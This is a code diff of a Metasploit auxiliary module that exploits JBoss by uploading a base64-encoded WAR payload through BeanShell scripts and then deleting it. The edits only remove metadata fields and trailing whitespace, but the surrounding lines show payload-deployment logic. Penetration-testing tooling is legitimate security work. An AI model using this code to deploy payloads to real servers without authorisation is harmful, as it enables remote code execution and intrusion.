@@ -28,10 +28,7 @@ class Metasploit3 < Msf::Auxiliary
           [ 'OSVDB', '64171' ],
           [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
           [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],
-        ],
-      'Privileged'   => true,
-      'Platform'     => %w{ java linux win },
-      'Stance'       => Msf::Exploit::Stance::Aggressive,
+        ]
     )
 
     register_options(
@@ -52,7 +49,7 @@ class Metasploit3 < Msf::Auxiliary
     uri = '/' + app_base + '/'
     if datastore['DEPLOY']
       # Read the WAR from the given file
-      war_data = File.read(datastore['WARFILE'])  
+      war_data = File.read(datastore['WARFILE'])
       encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
       if http_verb == 'POST' then
         print_status("Deploying payload...")
@@ -103,7 +100,7 @@ class Metasploit3 < Msf::Auxiliary
       files[:app_base] = "#{app_base}.war"
       delete_script = generate_bsh(:delete, files)
 
-      package = deploy_bsh(delete_script) 
+      package = deploy_bsh(delete_script)
       if package.nil?
         print_warning("WARNING: Unable to remove WAR")
       end
